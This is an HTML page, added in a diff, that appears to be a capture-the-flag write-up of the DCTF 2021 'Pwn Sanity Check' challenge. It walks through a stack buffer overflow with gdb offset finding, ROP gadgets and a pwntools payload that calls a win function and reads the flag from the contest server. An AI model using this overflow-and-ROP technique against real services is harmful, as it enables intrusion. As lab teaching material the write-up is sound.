@@ -1,0 +1,229 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" lang="" xml:lang="">
+<head>
+  <meta charset="utf-8" />
+  <meta name="generator" content="pandoc" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes" />
+  <title>Pwn Sanity Check</title>
+  <style>
+      code{white-space: pre-wrap;}
+      span.smallcaps{font-variant: small-caps;}
+      span.underline{text-decoration: underline;}
+      div.column{display: inline-block; vertical-align: top; width: 50%;}
+  </style>
+  <style>
+pre > code.sourceCode { white-space: pre; position: relative; }
+pre > code.sourceCode > span { display: inline-block; line-height: 1.25; }
+pre > code.sourceCode > span:empty { height: 1.2em; }
+code.sourceCode > span { color: inherit; text-decoration: inherit; }
+div.sourceCode { margin: 1em 0; }
+pre.sourceCode { margin: 0; }
+@media screen {
+div.sourceCode { overflow: auto; }
+}
+@media print {
+pre > code.sourceCode { white-space: pre-wrap; }
+pre > code.sourceCode > span { text-indent: -5em; padding-left: 5em; }
+}
+pre.numberSource code
+  { counter-reset: source-line 0; }
+pre.numberSource code > span
+  { position: relative; left: -4em; counter-increment: source-line; }
+pre.numberSource code > span > a:first-child::before
+  { content: counter(source-line);
+    position: relative; left: -1em; text-align: right; vertical-align: baseline;
+    border: none; display: inline-block;
+    -webkit-touch-callout: none; -webkit-user-select: none;
+    -khtml-user-select: none; -moz-user-select: none;
+    -ms-user-select: none; user-select: none;
+    padding: 0 4px; width: 4em;
+    background-color: #232629;
+    color: #7a7c7d;
+  }
+pre.numberSource { margin-left: 3em; border-left: 1px solid #7a7c7d;  padding-left: 4px; }
+div.sourceCode
+  { color: #cfcfc2; background-color: #232629; }
+@media screen {
+pre > code.sourceCode > span > a:first-child::before { text-decoration: underline; }
+}
+code span. { color: #cfcfc2; } /* Normal */
+code span.al { color: #95da4c; background-color: #4d1f24; font-weight: bold; } /* Alert */
+code span.an { color: #3f8058; } /* Annotation */
+code span.at { color: #2980b9; } /* Attribute */
+code span.bn { color: #f67400; } /* BaseN */
+code span.bu { color: #7f8c8d; } /* BuiltIn */
+code span.cf { color: #fdbc4b; font-weight: bold; } /* ControlFlow */
+code span.ch { color: #3daee9; } /* Char */
+code span.cn { color: #27aeae; font-weight: bold; } /* Constant */
+code span.co { color: #7a7c7d; } /* Comment */
+code span.cv { color: #7f8c8d; } /* CommentVar */
+code span.do { color: #a43340; } /* Documentation */
+code span.dt { color: #2980b9; } /* DataType */
+code span.dv { color: #f67400; } /* DecVal */
+code span.er { color: #da4453; text-decoration: underline; } /* Error */
+code span.ex { color: #0099ff; font-weight: bold; } /* Extension */
+code span.fl { color: #f67400; } /* Float */
+code span.fu { color: #8e44ad; } /* Function */
+code span.im { color: #27ae60; } /* Import */
+code span.in { color: #c45b00; } /* Information */
+code span.kw { color: #cfcfc2; font-weight: bold; } /* Keyword */
+code span.op { color: #cfcfc2; } /* Operator */
+code span.ot { color: #27ae60; } /* Other */
+code span.pp { color: #27ae60; } /* Preprocessor */
+code span.re { color: #2980b9; background-color: #153042; } /* RegionMarker */
+code span.sc { color: #3daee9; } /* SpecialChar */
+code span.ss { color: #da4453; } /* SpecialString */
+code span.st { color: #f44f4f; } /* String */
+code span.va { color: #27aeae; } /* Variable */
+code span.vs { color: #da4453; } /* VerbatimString */
+code span.wa { color: #da4453; } /* Warning */
+  </style>
+  <!--[if lt IE 9]>
+    <script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7.3/html5shiv-printshiv.min.js"></script>
+  <![endif]-->
+      <meta charset="UTF-8">
+      <meta name=”robots” content="index, follow">
+      <meta name="description" content="CTF Writeups, hacking techniques, reverse engineering & binary exploit, etc.">
+      <title>Onealmond</title>
+      <link rel="stylesheet" type="text/css" href="../../css/global.css"></link>
+      <script type="text/javascript" src="../../js/common.js"></script>
+</head>
+<body>
+    <div id="header"><a class="header" href="../../index.html">[]|\|[-/-\|_/\/\[]|\||)</a></div>
+    <div id="content" class="content" style="width:70%;height:auto">
+<header id="title-block-header">
+<h1 class="title">Pwn Sanity Check</h1>
+</header>
+<p>Function <em>vuln</em> calls <em>shell</em>, which was not going to spawn a shell, but <em>win</em> function would. <em>vuln</em> took <em>0x100</em> bytes of input, but <em>local_48</em> can only take <em>60</em>, overflow it then call <em>win</em> shall bring a shell.</p>
+<div class="sourceCode" id="cb1"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb1-1"><a href="#cb1-1"></a><span class="dt">void</span> vuln(<span class="dt">void</span>)</span>
+<span id="cb1-2"><a href="#cb1-2"></a>{</span>
+<span id="cb1-3"><a href="#cb1-3"></a>  <span class="dt">char</span> local_48 [<span class="dv">60</span>];</span>
+<span id="cb1-4"><a href="#cb1-4"></a>  <span class="dt">int</span> local_c;</span>
+<span id="cb1-5"><a href="#cb1-5"></a>  </span>
+<span id="cb1-6"><a href="#cb1-6"></a>  puts(<span class="st">&quot;tell me a joke&quot;</span>);</span>
+<span id="cb1-7"><a href="#cb1-7"></a>  fgets(local_48,<span class="bn">0x100</span>,stdin);</span>
+<span id="cb1-8"><a href="#cb1-8"></a>  <span class="cf">if</span> (local_c == -<span class="bn">0x21523f22</span>) {</span>
+<span id="cb1-9"><a href="#cb1-9"></a>    puts(<span class="st">&quot;very good, here is a shell for you. &quot;</span>);</span>
+<span id="cb1-10"><a href="#cb1-10"></a>    shell();</span>
+<span id="cb1-11"><a href="#cb1-11"></a>  }</span>
+<span id="cb1-12"><a href="#cb1-12"></a>  <span class="cf">else</span> {</span>
+<span id="cb1-13"><a href="#cb1-13"></a>    puts(<span class="st">&quot;will this work?&quot;</span>);</span>
+<span id="cb1-14"><a href="#cb1-14"></a>  }</span>
+<span id="cb1-15"><a href="#cb1-15"></a>  <span class="cf">return</span>;</span>
+<span id="cb1-16"><a href="#cb1-16"></a>}</span>
+<span id="cb1-17"><a href="#cb1-17"></a></span>
+<span id="cb1-18"><a href="#cb1-18"></a><span class="dt">void</span> shell(<span class="dt">void</span>)</span>
+<span id="cb1-19"><a href="#cb1-19"></a>{</span>
+<span id="cb1-20"><a href="#cb1-20"></a>  puts(<span class="st">&quot;spawning /bin/sh process&quot;</span>);</span>
+<span id="cb1-21"><a href="#cb1-21"></a>  puts(<span class="st">&quot;wush!&quot;</span>);</span>
+<span id="cb1-22"><a href="#cb1-22"></a>  printf(<span class="st">&quot;$&gt; &quot;</span>);</span>
+<span id="cb1-23"><a href="#cb1-23"></a>  puts(<span class="st">&quot;If this is not good enough, you will just have to try harder :)&quot;</span>);</span>
+<span id="cb1-24"><a href="#cb1-24"></a>  <span class="cf">return</span>;</span>
+<span id="cb1-25"><a href="#cb1-25"></a>}</span>
+<span id="cb1-26"><a href="#cb1-26"></a></span>
+<span id="cb1-27"><a href="#cb1-27"></a><span class="dt">void</span> win(<span class="dt">int</span> param_1,<span class="dt">int</span> param_2)</span>
+<span id="cb1-28"><a href="#cb1-28"></a>{</span>
+<span id="cb1-29"><a href="#cb1-29"></a>  puts(<span class="st">&quot;you made it to win land, no free handouts this time, try harder&quot;</span>);</span>
+<span id="cb1-30"><a href="#cb1-30"></a>  <span class="cf">if</span> (param_1 == -<span class="bn">0x21524111</span>) {</span>
+<span id="cb1-31"><a href="#cb1-31"></a>    puts(<span class="st">&quot;one down, one to go!&quot;</span>);</span>
+<span id="cb1-32"><a href="#cb1-32"></a>    <span class="cf">if</span> (param_2 == <span class="bn">0x1337c0de</span>) {</span>
+<span id="cb1-33"><a href="#cb1-33"></a>      puts(<span class="st">&quot;2/2 bro good job&quot;</span>);</span>
+<span id="cb1-34"><a href="#cb1-34"></a>      system(<span class="st">&quot;/bin/sh&quot;</span>);</span>
+<span id="cb1-35"><a href="#cb1-35"></a>                    <span class="co">/* </span><span class="al">WARNING</span><span class="co">: Subroutine does not return */</span></span>
+<span id="cb1-36"><a href="#cb1-36"></a>      exit(<span class="dv">0</span>);</span>
+<span id="cb1-37"><a href="#cb1-37"></a>    }</span>
+<span id="cb1-38"><a href="#cb1-38"></a>  }</span>
+<span id="cb1-39"><a href="#cb1-39"></a>  <span class="cf">return</span>;</span>
+<span id="cb1-40"><a href="#cb1-40"></a>}</span></code></pre></div>
+<h3 id="find-the-padding">Find The Padding</h3>
+<p>Run in <em>gdb</em>, input a precreated 100 bytes pattern to overflow the array,</p>
+<div class="sourceCode" id="cb2"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb2-1"><a href="#cb2-1"></a><span class="ex">gef</span>➤  pattern create 100                                                            </span>
+<span id="cb2-2"><a href="#cb2-2"></a>[<span class="ex">+</span>] Generating a pattern of 100 bytes                                                                                                                                   </span>
+<span id="cb2-3"><a href="#cb2-3"></a><span class="ex">aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa</span>                                                                    </span>
+<span id="cb2-4"><a href="#cb2-4"></a>[<span class="ex">+</span>] Saved as <span class="st">&#39;$_gef0&#39;</span>                                                                                                                                                   </span>
+<span id="cb2-5"><a href="#cb2-5"></a><span class="ex">gef</span>➤  r                                                                             </span>
+<span id="cb2-6"><a href="#cb2-6"></a><span class="ex">Starting</span> program: /home/zex/lab_ex/hacking-lab/dctf-2021/pwn-sanity-check/pwn_sanity_check                                                                              </span>
+<span id="cb2-7"><a href="#cb2-7"></a><span class="ex">tell</span> me a joke                                                                      </span>
+<span id="cb2-8"><a href="#cb2-8"></a><span class="ex">aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa</span>                                                                    </span>
+<span id="cb2-9"><a href="#cb2-9"></a><span class="ex">will</span> this work?                                                                     </span>
+<span id="cb2-10"><a href="#cb2-10"></a>                                                                                    </span>
+<span id="cb2-11"><a href="#cb2-11"></a><span class="ex">Program</span> received signal SIGSEGV, Segmentation fault.   </span>
+<span id="cb2-12"><a href="#cb2-12"></a><span class="ex">...</span></span></code></pre></div>
+<p>Checked out <em>rip</em> for the address, searched the patten, the offset was likely to be <em>72</em>, so <em>72</em> bytes padding might be needed.</p>
+<div class="sourceCode" id="cb3"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb3-1"><a href="#cb3-1"></a><span class="ex">gef</span>➤  info frame </span>
+<span id="cb3-2"><a href="#cb3-2"></a><span class="ex">Stack</span> level 0, frame at 0x7fffffffda98:</span>
+<span id="cb3-3"><a href="#cb3-3"></a> <span class="ex">rip</span> = 0x40078b in vuln<span class="kw">;</span> <span class="ex">saved</span> rip = 0x616161616161616a</span>
+<span id="cb3-4"><a href="#cb3-4"></a> <span class="ex">called</span> by frame at 0x7fffffffdaa8</span>
+<span id="cb3-5"><a href="#cb3-5"></a> <span class="ex">Arglist</span> at 0x6161616161616169, args: </span>
+<span id="cb3-6"><a href="#cb3-6"></a> <span class="ex">Locals</span> at 0x6161616161616169, Previous frame<span class="st">&#39;s sp is 0x7fffffffdaa0</span></span>
+<span id="cb3-7"><a href="#cb3-7"></a><span class="st"> Saved registers:</span></span>
+<span id="cb3-8"><a href="#cb3-8"></a><span class="st">  rip at 0x7fffffffda98</span></span>
+<span id="cb3-9"><a href="#cb3-9"></a><span class="st">gef➤  pattern search 0x616161616161616a</span></span>
+<span id="cb3-10"><a href="#cb3-10"></a><span class="st">[+] Searching &#39;</span>0x616161616161616a<span class="st">&#39;</span></span>
+<span id="cb3-11"><a href="#cb3-11"></a><span class="st">[+] Found at offset 72 (little-endian search) likely</span></span>
+<span id="cb3-12"><a href="#cb3-12"></a><span class="st">[+] Found at offset 65 (big-endian search) </span></span></code></pre></div>
+<h3 id="pass-the-parameters">Pass The Parameters</h3>
+<p>Took a look into the asm code from <em>objdump</em>, <em>win</em> used <em>edi</em> for the first parameter and <em>esi</em> for the second one, they were supposed to be <em>0xdeadbeef</em> and <em>0x1337c0de</em>, respectively.</p>
+<div class="sourceCode" id="cb4"><pre class="sourceCode asm"><code class="sourceCode fasm"><span id="cb4-1"><a href="#cb4-1"></a><span class="dv">0000000000400697</span> &lt;win&gt;:</span>
+<span id="cb4-2"><a href="#cb4-2"></a><span class="fu">  400697:</span>       <span class="dv">55</span>                      <span class="bu">push</span>   %<span class="kw">rbp</span></span>
+<span id="cb4-3"><a href="#cb4-3"></a><span class="fu">  400698:</span>       <span class="dv">48</span> <span class="dv">89</span> e5                <span class="bu">mov</span>    %<span class="kw">rsp</span>,%<span class="kw">rbp</span></span>
+<span id="cb4-4"><a href="#cb4-4"></a><span class="fu">  40069b:</span>       <span class="dv">48</span> <span class="dv">83</span> ec <span class="dv">10</span>             <span class="bu">sub</span>    <span class="dv">$</span><span class="bn">0x10,</span>%<span class="kw">rsp</span></span>
+<span id="cb4-5"><a href="#cb4-5"></a><span class="fu">  40069f:</span>       <span class="dv">89</span> 7d fc                <span class="bu">mov</span>    %<span class="kw">edi</span>,-<span class="bn">0x4</span>(%<span class="kw">rbp</span>)</span>
+<span id="cb4-6"><a href="#cb4-6"></a><span class="fu">  4006a2:</span>       <span class="dv">89</span> <span class="dv">75</span> f8                <span class="bu">mov</span>    %<span class="kw">esi</span>,-<span class="bn">0x8</span>(%<span class="kw">rbp</span>)</span>
+<span id="cb4-7"><a href="#cb4-7"></a><span class="fu">  4006a5:</span>       <span class="dv">48</span> 8d 3d 8c <span class="dv">01</span> <span class="dv">00</span> <span class="dv">00</span>    <span class="bu">lea</span>    <span class="bn">0x18c</span>(%rip),%<span class="kw">rdi</span>        # <span class="dv">400838</span> &lt;_IO_stdin_used+<span class="bn">0x8</span>&gt;</span>
+<span id="cb4-8"><a href="#cb4-8"></a><span class="fu">  4006ac:</span>       e8 9f fe ff ff          callq  <span class="dv">400550</span> &lt;puts@plt&gt;</span>
+<span id="cb4-9"><a href="#cb4-9"></a><span class="fu">  4006b1:</span>       <span class="dv">81</span> 7d fc ef be ad de    cmpl   <span class="dv">$</span><span class="bn">0xdeadbeef</span>,-<span class="bn">0x4</span>(%<span class="kw">rbp</span>)</span>
+<span id="cb4-10"><a href="#cb4-10"></a><span class="fu">  4006b8:</span>       <span class="dv">75</span> <span class="dv">37</span>                   <span class="bu">jne</span>    4006f1 &lt;win+<span class="bn">0x5a</span>&gt;</span>
+<span id="cb4-11"><a href="#cb4-11"></a><span class="fu">  4006ba:</span>       <span class="dv">48</span> 8d 3d b7 <span class="dv">01</span> <span class="dv">00</span> <span class="dv">00</span>    <span class="bu">lea</span>    <span class="bn">0x1b7</span>(%rip),%<span class="kw">rdi</span>        # <span class="dv">400878</span> &lt;_IO_stdin_used+<span class="bn">0x48</span>&gt;</span>
+<span id="cb4-12"><a href="#cb4-12"></a><span class="fu">  4006c1:</span>       e8 8a fe ff ff          callq  <span class="dv">400550</span> &lt;puts@plt&gt;</span>
+<span id="cb4-13"><a href="#cb4-13"></a><span class="fu">  4006c6:</span>       <span class="dv">81</span> 7d f8 de c0 <span class="dv">37</span> <span class="dv">13</span>    cmpl   <span class="dv">$</span><span class="bn">0x1337c0de,</span>-<span class="bn">0x8</span>(%<span class="kw">rbp</span>)</span>
+<span id="cb4-14"><a href="#cb4-14"></a><span class="fu">  4006cd:</span>       <span class="dv">75</span> <span class="dv">22</span>                   <span class="bu">jne</span>    4006f1 &lt;win+<span class="bn">0x5a</span>&gt;</span>
+<span id="cb4-15"><a href="#cb4-15"></a><span class="fu">  4006cf:</span>       <span class="dv">48</span> 8d 3d b7 <span class="dv">01</span> <span class="dv">00</span> <span class="dv">00</span>    <span class="bu">lea</span>    <span class="bn">0x1b7</span>(%rip),%<span class="kw">rdi</span>        # 40088d &lt;_IO_stdin_used+<span class="bn">0x5d</span>&gt;</span>
+<span id="cb4-16"><a href="#cb4-16"></a><span class="fu">  4006d6:</span>       e8 <span class="dv">75</span> fe ff ff          callq  <span class="dv">400550</span> &lt;puts@plt&gt;</span>
+<span id="cb4-17"><a href="#cb4-17"></a><span class="fu">  4006db:</span>       <span class="dv">48</span> 8d 3d bc <span class="dv">01</span> <span class="dv">00</span> <span class="dv">00</span>    <span class="bu">lea</span>    <span class="bn">0x1bc</span>(%rip),%<span class="kw">rdi</span>        # 40089e &lt;_IO_stdin_used+<span class="bn">0x6e</span>&gt;</span>
+<span id="cb4-18"><a href="#cb4-18"></a><span class="fu">  4006e2:</span>       e8 <span class="dv">79</span> fe ff ff          callq  <span class="dv">400560</span> &lt;system@plt&gt;</span>
+<span id="cb4-19"><a href="#cb4-19"></a><span class="fu">  4006e7:</span>       bf <span class="dv">00</span> <span class="dv">00</span> <span class="dv">00</span> <span class="dv">00</span>          <span class="bu">mov</span>    <span class="dv">$</span><span class="bn">0x0,</span>%<span class="kw">edi</span></span>
+<span id="cb4-20"><a href="#cb4-20"></a><span class="fu">  4006ec:</span>       e8 af fe ff ff          callq  4005a0 &lt;exit@plt&gt;</span>
+<span id="cb4-21"><a href="#cb4-21"></a><span class="fu">  4006f1:</span>       <span class="dv">90</span>                      <span class="bu">nop</span></span>
+<span id="cb4-22"><a href="#cb4-22"></a><span class="fu">  4006f2:</span>       c9                      leaveq </span>
+<span id="cb4-23"><a href="#cb4-23"></a><span class="fu">  4006f3:</span>       c3                      retq  </span></code></pre></div>
+<p>To pass the parameters, gadgets can be handy. Gadget <em>‘pop rsi; ret;’</em> wasn’t found, but <em>‘pop rsi; pop r15; ret;’</em> also work.</p>
+<div class="sourceCode" id="cb5"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb5-1"><a href="#cb5-1"></a>$ <span class="ex">ROPgadget</span> --binary pwn_sanity_check <span class="kw">|</span><span class="fu">grep</span> <span class="st">&quot;pop rsi&quot;</span></span>
+<span id="cb5-2"><a href="#cb5-2"></a><span class="ex">0x0000000000400811</span> : pop rsi <span class="kw">;</span> <span class="ex">pop</span> r15 <span class="kw">;</span> <span class="ex">ret</span></span></code></pre></div>
+<p>Used <em>pwn.ROP</em> in python.</p>
+<div class="sourceCode" id="cb6"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb6-1"><a href="#cb6-1"></a>pop_rdi <span class="op">=</span> pwn.p64(rop.find_gadget([<span class="st">&#39;pop rdi&#39;</span>, <span class="st">&#39;ret&#39;</span>]).address)</span>
+<span id="cb6-2"><a href="#cb6-2"></a>pop_rsi <span class="op">=</span> pwn.p64(rop.find_gadget([<span class="st">&#39;pop rsi&#39;</span>, <span class="st">&#39;pop r15&#39;</span>, <span class="st">&#39;ret&#39;</span>]).address)</span></code></pre></div>
+<h3 id="cat-flag.txt">Cat Flag.txt</h3>
+<p>Combined them all, the payload was created as below.</p>
+<div class="sourceCode" id="cb7"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb7-1"><a href="#cb7-1"></a>payload <span class="op">=</span> b<span class="st">&quot;A&quot;</span><span class="op">*</span><span class="dv">72</span></span>
+<span id="cb7-2"><a href="#cb7-2"></a>payload <span class="op">+=</span> pop_rdi</span>
+<span id="cb7-3"><a href="#cb7-3"></a>payload <span class="op">+=</span> pwn.p64(<span class="bn">0xdeadbeef</span>)</span>
+<span id="cb7-4"><a href="#cb7-4"></a>payload <span class="op">+=</span> pop_rsi</span>
+<span id="cb7-5"><a href="#cb7-5"></a>payload <span class="op">+=</span> pwn.p64(<span class="bn">0x1337c0de</span>)</span>
+<span id="cb7-6"><a href="#cb7-6"></a>payload <span class="op">+=</span> pwn.p64(<span class="bn">0x1337c0de</span>)</span>
+<span id="cb7-7"><a href="#cb7-7"></a>payload <span class="op">+=</span> pwn.p64(elf.sym[<span class="st">&#39;win&#39;</span>])</span></code></pre></div>
+<p>Cat the flag once pwned. Complete exploit is <a href="https://github.com/onealmond/hacking-lab/blob/master/dctf-2021/pwn-sanity-check/exploit.py">here</a>.</p>
+<div class="sourceCode" id="cb8"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb8-1"><a href="#cb8-1"></a><span class="bu">print</span>(payload, <span class="bu">len</span>(payload))</span>
+<span id="cb8-2"><a href="#cb8-2"></a>pr.sendafter(<span class="st">&quot;joke</span><span class="ch">\n</span><span class="st">&quot;</span>, payload)</span>
+<span id="cb8-3"><a href="#cb8-3"></a>pr.sendline()</span>
+<span id="cb8-4"><a href="#cb8-4"></a>pr.sendline(<span class="st">&quot;cat flag.txt&quot;</span>)</span>
+<span id="cb8-5"><a href="#cb8-5"></a><span class="bu">print</span>(pr.readall(<span class="dv">2</span>))</span></code></pre></div>
+<div class="sourceCode" id="cb9"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb9-1"><a href="#cb9-1"></a>$ <span class="ex">python3</span> exploit.py </span>
+<span id="cb9-2"><a href="#cb9-2"></a>[<span class="ex">+</span>] Opening connection to dctf-chall-pwn-sanity-check.westeurope.azurecontainer.io on port 7480: Done</span>
+<span id="cb9-3"><a href="#cb9-3"></a>[<span class="ex">*</span>] <span class="st">&#39;/home/zex/lab_ex/hacking-lab/dctf-2021/pwn-sanity-check/pwn_sanity_check&#39;</span></span>
+<span id="cb9-4"><a href="#cb9-4"></a>    <span class="ex">Arch</span>:     amd64-64-little</span>
+<span id="cb9-5"><a href="#cb9-5"></a>    <span class="ex">RELRO</span>:    Partial RELRO</span>
+<span id="cb9-6"><a href="#cb9-6"></a>    <span class="ex">Stack</span>:    No canary found</span>
+<span id="cb9-7"><a href="#cb9-7"></a>    <span class="ex">NX</span>:       NX enabled</span>
+<span id="cb9-8"><a href="#cb9-8"></a>    <span class="ex">PIE</span>:      No PIE (0x400000)</span>
+<span id="cb9-9"><a href="#cb9-9"></a>[<span class="ex">*</span>] Loaded 14 cached gadgets for <span class="st">&#39;pwn_sanity_check&#39;</span></span>
+<span id="cb9-10"><a href="#cb9-10"></a><span class="ex">b</span><span class="st">&#39;\x13\x08@\x00\x00\x00\x00\x00&#39;</span></span>
+<span id="cb9-11"><a href="#cb9-11"></a><span class="ex">b</span><span class="st">&#39;\x11\x08@\x00\x00\x00\x00\x00&#39;</span></span>
+<span id="cb9-12"><a href="#cb9-12"></a><span class="ex">b</span><span class="st">&#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x13\x08@\x00\x00\x00\x00\x00\xef\xbe\xad\xde\x00\x00\x00\x00\x11\x08@\x00\x00\x00\x00\x00\xde\xc07\x13\x00\x00\x00\x00\xde\xc07\x13\x00\x00\x00\x00\x97\x06@\x00\x00\x00\x00\x00&#39;</span> 120</span>
+<span id="cb9-13"><a href="#cb9-13"></a>[<span class="ex">+</span>] Receiving all data: Done (137B)</span>
+<span id="cb9-14"><a href="#cb9-14"></a>[<span class="ex">*</span>] Closed connection to dctf-chall-pwn-sanity-check.westeurope.azurecontainer.io port 7480</span>
+<span id="cb9-15"><a href="#cb9-15"></a><span class="ex">b</span><span class="st">&#39;will this work?\nyou made it to win land, no free handouts this time, try harder\none down, one to go!\n2/2 bro good job\ndctf{Ju5t_m0v3_0n}\n&#39;</span></span></code></pre></div>
+    </div>
+    <a id="back-to-top" class="back-to-top" href="#header">TOP</a>
+</body>
+</html>
